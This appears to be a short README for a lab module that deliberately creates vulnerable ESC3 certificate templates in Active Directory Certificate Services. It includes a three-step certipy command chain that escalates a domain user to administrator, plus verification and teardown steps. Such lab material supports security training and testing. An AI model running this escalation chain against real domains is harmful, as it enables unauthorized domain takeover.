# esc3

Enrollment agent template plus a template that accepts enrollment agents (ESC3). Creates and publishes `ESC3-CRA`, `ESC3` on the CA of the target host's forest, enrollable by `<NB>\Domain Users`.

Attack:

    certipy req -u <user>@<domain> -p 'Aa1234567890!' -dc-ip <dc ip> -ca <NB>-CA -template ESC3-CRA
    certipy req -u <user>@<domain> -p 'Aa1234567890!' -dc-ip <dc ip> -ca <NB>-CA -template ESC3 -on-behalf-of '<NB>\administrator' -pfx <user>.pfx
    certipy auth -pfx administrator.pfx -dc-ip <dc ip>

How to verify:

    certutil -catemplates | findstr ESC3
    certipy find -u <user>@<domain> -p 'Aa1234567890!' -dc-ip <dc ip> -vulnerable -stdout

Disable revokes every certificate issued from the template(s), unpublishes and deletes them.
